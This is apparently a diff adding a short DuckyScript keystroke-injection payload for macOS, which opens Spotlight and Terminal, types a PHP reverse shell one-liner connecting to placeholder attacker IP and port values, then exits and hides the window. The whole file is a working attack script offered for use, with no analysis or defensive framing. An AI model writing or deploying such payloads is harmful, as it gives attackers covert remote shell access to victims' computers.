@@ -1,0 +1,14 @@
+REM Creates a reverse shell using PHP
+DELAY #START_DELAY
+COMMAND SPACE
+DELAY #SEARCH_DELAY
+STRING terminal
+ENTER
+DELAY #TERMINAL_DELAY
+STRING php -r '$sock=fsockopen("
+STRING #IP
+STRING ",
+STRING #PORT
+STRING );`/bin/sh -i <&3 >&3 2>&3`;' &! exit
+ENTER
+COMMAND h
